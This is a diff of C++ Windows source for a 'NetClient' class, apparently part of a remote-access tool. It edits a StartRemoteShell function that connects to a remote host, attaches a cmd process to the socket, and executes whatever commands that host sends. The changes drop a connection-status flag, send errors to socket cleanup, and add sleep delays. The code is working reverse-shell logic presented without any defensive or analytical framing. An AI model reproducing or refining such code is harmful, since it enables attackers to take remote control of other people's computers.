@@ -21,7 +21,6 @@ NetClient::~NetClient()
 
 NetClient::NetClient(const char* p_hostip, const char* p_port, const char* p_hostname, const char* p_scriptfile, const char* p_scriptvarname, const char* p_scriptvarval)
 {
-	isRemoveShellActive = false;
 	ZeroMemory(&hostip, MAX_PATH);
 	ZeroMemory(&port, MAX_PATH);
 	ZeroMemory(&hostname, MAX_PATH);
@@ -35,11 +34,6 @@ NetClient::NetClient(const char* p_hostip, const char* p_port, const char* p_hos
 	strncpy_s(scriptfile, p_scriptfile, MAX_PATH);
 	strncpy_s(scriptvarname, p_scriptvarname, MAX_PATH);
 	strncpy_s(scriptvarval, p_scriptvarval, MAX_PATH);
-}
-
-bool NetClient::IsRemoteShellConnected()
-{
-	return isRemoveShellActive;
 }
 
 void NetClient::StartRemoteShell(const char* rhost_ip, const char* rhost_port)
@@ -62,14 +56,11 @@ void NetClient::StartRemoteShell(const char* rhost_ip, const char* rhost_port)
 	service.sin_port = htons(atoi(rhost_port));
 
 	LPHOSTENT host = gethostbyname(rhost_ip);
-	if (!host) return;
+	if (!host) goto closeSck;
 
 	service.sin_addr = *((LPIN_ADDR)*host->h_addr_list);
 	if (connect(fd, (SOCKADDR *)&service, sizeof(service)) < 0) 
-		return;
-
-	// we connected, update connection status
-	isRemoveShellActive = true;
+		goto closeSck;
 
 	// create pipes to cmd process
 	DWORD tmp = 0;
@@ -90,8 +81,11 @@ void NetClient::StartRemoteShell(const char* rhost_ip, const char* rhost_port)
 		goto closeSck;
 	}
 
+	Sleep(150);
+
 	while(1)
 	{
+
 		// make sure (cmd) process is still running
 		DWORD exitCode;
 		GetExitCodeProcess(pi.hProcess, &exitCode);
@@ -138,7 +132,7 @@ void NetClient::StartRemoteShell(const char* rhost_ip, const char* rhost_port)
 		}
 		else
 			goto closeSck;
-        
+
 		// receive remote commands (1024 bytes MAX) and execute them
 		delete [] buff;
 		buff = new char[1024];
@@ -148,7 +142,6 @@ void NetClient::StartRemoteShell(const char* rhost_ip, const char* rhost_port)
 
 		if (bytes_received <= 0) // connection has been closed, update status and exit
 		{
-			isRemoveShellActive = false;
 			goto closeSck;
 		}
 
@@ -160,6 +153,8 @@ void NetClient::StartRemoteShell(const char* rhost_ip, const char* rhost_port)
 
 		// (avoid memory leak)
 		delete [] buff;
+
+		Sleep(150);
    }
    closeSck:
        TerminateProcess(pi.hProcess, 0);
